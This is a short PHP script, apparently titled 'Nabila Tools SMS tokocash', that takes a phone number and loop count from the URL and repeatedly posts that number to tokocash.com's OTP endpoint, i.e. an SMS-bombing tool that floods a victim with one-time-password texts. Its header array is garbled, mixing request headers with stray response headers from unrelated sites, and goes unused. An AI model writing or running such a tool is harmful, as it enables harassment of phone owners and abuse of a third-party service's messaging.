
<?php


if(!$_GET['no']){ 
echo "Nabila Tools SMS tokocash";
}else{
$loop = $_GET['loop'];
$no = $_GET['no'];
            $header = array(
		    'Host: www.tokocash.com:443',
		    'User-Agent: Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.89 Safari/537.36',
		    'Accept: */*',
		    'Accept-Language: en-US,en;q=0.5',
		    'Accept-Encoding: gzip, deflate, br',
		    'Content-Type: application/x-www-form-urlencoded',
		    'Referer: https://www.tokocash.com/oauth/otp',
		    'Content-Length: 106',
		    'Origin: https://www.tokocash.com/oauth/otp',
		    'Connection: keep-alive',
		    'Cookie: _StID_Wallet_=0686e269-70b0-4da7-9dda-84265f3581f8',
		    'HTTP/1.1 200 OK',
		    'Server: nginx',
		    'Date: Tue, 15 May 2018 21:55:12 GMT',
		    'Content-Type: application/json',
		    'Transfer-Encoding: chunked',
		    'Connection: keep-alive',
		    'Keep-Alive: timeout=75',
		    'Vary: Accept-Encoding',
		    'X-Powered-By: PHP/5.6.34',
		    'Set-Cookie: user_tracking=ba4c611c4fbf5658a8a587f43d88d35a; path=/; domain=.icq.com; secure; HttpOnly',
		    'X-XSS-Protection: 1; mode=block; report=https://cspreport.mail.ru/xxssprotection',
		    'X-Content-Type-Options: nosniff',
		    'X-Frame-Options: SAMEORIGIN',
		    'Strict-Transport-Security: max-age=600; includeSubDomains; preload',
		    'Content-Encoding: gzip',);
    function http($postdata){
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, 'https://www.tokocash.com/oauth/otp');
        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.62 Safari/537.36');
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_VERBOSE, false);
        if(!empty($postdata)){
            curl_setopt($ch, CURLOPT_POST, true);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $postdata);
        }
        $response = curl_exec($ch);
        $http = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);

        return array($http, $response);
    }
    for ($i = 0;$i < $loop ;$i++) {
    http("msisdn=".$no."&accept="); 
    echo "SMS ke ".$no." Sukses<br>";
}
}

?>